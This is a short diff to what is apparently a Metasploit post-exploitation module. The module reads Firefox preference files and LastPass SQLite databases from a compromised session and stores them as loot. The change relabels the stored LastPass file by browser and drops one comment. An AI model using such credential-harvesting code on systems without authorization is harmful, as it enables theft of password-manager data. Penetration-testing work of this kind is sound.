@@ -43,7 +43,6 @@ class Metasploit3 < Msf::Post
     db_map.each_pair do |browser, paths|
       if browser == 'Firefox'
         paths.each do |path|
-          # Read and store the remote preferences file locally
           data = read_file(path)
           loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{path}")
 
@@ -57,7 +56,7 @@ class Metasploit3 < Msf::Post
       else # Chrome, Safari and Opera
         paths.each do |path|
           data = read_file(path)
-          loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{path}")
+          loot_path = store_loot("#{browser.downcase}.lastpass.database", 'application/x-sqlite3', session, data, nil, "#{browser} LastPass database #{path}")
 
           # Parsing/Querying the DB
           db = SQLite3::Database.new(loot_path)
